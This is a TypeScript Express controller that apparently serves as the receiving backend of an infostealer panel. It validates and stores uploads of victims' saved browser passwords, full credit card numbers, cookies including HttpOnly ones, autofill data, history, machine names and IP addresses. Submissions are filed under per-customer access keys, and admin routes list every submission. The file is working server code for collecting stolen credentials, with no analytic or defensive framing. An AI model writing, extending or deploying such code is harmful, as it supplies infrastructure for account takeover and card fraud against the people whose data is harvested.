import { Request, Response } from 'express';
import { z } from 'zod';
import { AuthenticatedRequest } from '../middleware/accessKey';
import {
  SubmissionService,
  getBrowserSubmissions,
  getBrowserSubmissionsAll,
  getDashboardSubmissions,
  getDashboardSubmissionsAll,
} from '../services/submissionService';
import { getUserByAccessKey } from '../services/userService';
import { Logger } from '../utils/logger';

/**
 * Zod schema for browser data validation.
 */
const browserDataSchema = z.object({
  browser: z.string(),
  ip: z.string().optional(),
  desktop_name: z.string().optional(),
  passwords: z
    .array(
      z.object({
        url: z.string(),
        username: z.string(),
        password: z.string(),
      }),
    )
    .optional(),
  autofill: z
    .array(
      z.object({
        name: z.string(),
        value: z.string(),
      }),
    )
    .optional(),
  credit_cards: z
    .array(
      z.object({
        guid: z.string(),
        name_on_card: z.string(),
        card_number: z.string(),
        expiration_month: z.union([z.number(), z.string().transform(Number)]),
        expiration_year: z.union([z.number(), z.string().transform(Number)]),
      }),
    )
    .optional(),
  cookies: z
    .array(
      z.object({
        host: z.string(),
        name: z.string(),
        value: z.string(),
        path: z.string(),
        expires_utc: z.union([z.number(), z.string().transform(Number)]),
        secure: z.boolean(),
        httponly: z.boolean(),
      }),
    )
    .optional(),
  history: z
    .array(
      z.object({
        url: z.string(),
        title: z.string(),
        visit_count: z.union([z.number(), z.string().transform(Number)]),
        last_visit_time: z.union([z.number(), z.string().transform(Number)]),
      }),
    )
    .optional(),
});

/**
 * Browser submission payload
 */
export interface BrowserSubmission {
  id: number;
  user_id: number;
  browser: string;
  type: 'autofill' | 'passwords' | 'history' | 'cookies' | 'credit_cards'; // Use proper types
  data: object;
  desktop_name?: string;
  ip_address?: string;
  created_at: string;
  username?: string;
}

/**
 * Handles uploading browser data.
 * Validates input and saves to the database using SubmissionService.
 */
export const browserController = {
  uploadBrowserData: async (req: AuthenticatedRequest, res: Response) => {
    try {
      // Accept both { ...browserData } and { data: { ...browserData } }
      let body = req.body;
      if (body && typeof body === 'object' && 'data' in body && typeof body.data === 'object') {
        body = body.data;
      }

      // Use ip from body if present, else fallback to Express
      const ipAddress =
        (body && typeof body.ip === 'string' && body.ip) ||
        req.ip ||
        req.connection.remoteAddress ||
        'unknown';
      let data: string | undefined;
      let filePath: string | undefined;
      let fileName: string | undefined;

      if (body && Object.keys(body).length > 0) {
        const parsedData = browserDataSchema.parse(body);
        data = JSON.stringify(parsedData);
      }

      if (!data) {
        return res.status(400).json({ error: 'No data provided' });
      }

      const accessKey = req.query.key as string | undefined;
      if (!accessKey) {
        return res.status(400).json({ error: 'Access key is required in query' });
      }

      const user = await getUserByAccessKey(accessKey);
      if (!user) {
        return res.status(403).json({ error: 'Invalid access key' });
      }

      Logger.info('Browser data submission received', {
        userId: user.id,
        username: user.username,
        hasData: !!data,
        ipAddress,
      });

      await SubmissionService.createSubmission(
        user.id,
        'browser',
        data,
        filePath,
        fileName,
        ipAddress,
      );

      res.status(200).json({ message: 'Browser data received successfully' });
    } catch (error: any) {
      Logger.error('Browser upload error', {
        userId: req.user?.id,
        hasBody: !!req.body,
        error: error.message,
        errorType: error.name,
      });

      if (error.name === 'ZodError') {
        return res.status(400).json({ error: 'Invalid request data format' });
      }
      if (error.code === 'SQLITE_CONSTRAINT') {
        return res.status(500).json({ error: 'Database error' });
      }
      res.status(400).json({ error: 'Invalid request data' });
    }
  },

  /**
   * Get all browser submissions for the current user, pretty formatted.
   */
  getUserBrowserSubmissions: async (req: AuthenticatedRequest, res: Response) => {
    try {
      const userId = req.user?.id;
      if (!userId) {
        return res.status(401).json({ error: 'Unauthorized' });
      }
      const submissions = await getBrowserSubmissions(userId);
      res.status(200).json({ submissions });
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch browser submissions' });
    }
  },

  /**
   * (Admin) Get all browser submissions for all users, pretty formatted.
   */
  getAllBrowserSubmissions: async (_req: Request, res: Response) => {
    try {
      const submissions = await getBrowserSubmissionsAll();
      res.status(200).json({ submissions });
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch all browser submissions' });
    }
  },

  /**
   * Get all submissions for the current user, grouped for dashboard.
   */
  getUserDashboardSubmissions: async (req: AuthenticatedRequest, res: Response) => {
    try {
      const userId = req.user?.id;
      if (!userId) {
        return res.status(401).json({ error: 'Unauthorized' });
      }
      const submissions = await getDashboardSubmissions(userId);
      res.status(200).json(submissions);
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch dashboard submissions' });
    }
  },

  /**
   * (Admin) Get all submissions for all users, grouped for dashboard.
   */
  getAllDashboardSubmissions: async (_req: Request, res: Response) => {
    try {
      const submissions = await getDashboardSubmissionsAll();
      res.status(200).json(submissions);
    } catch (error) {
      res.status(500).json({ error: 'Failed to fetch all dashboard submissions' });
    }
  },
};
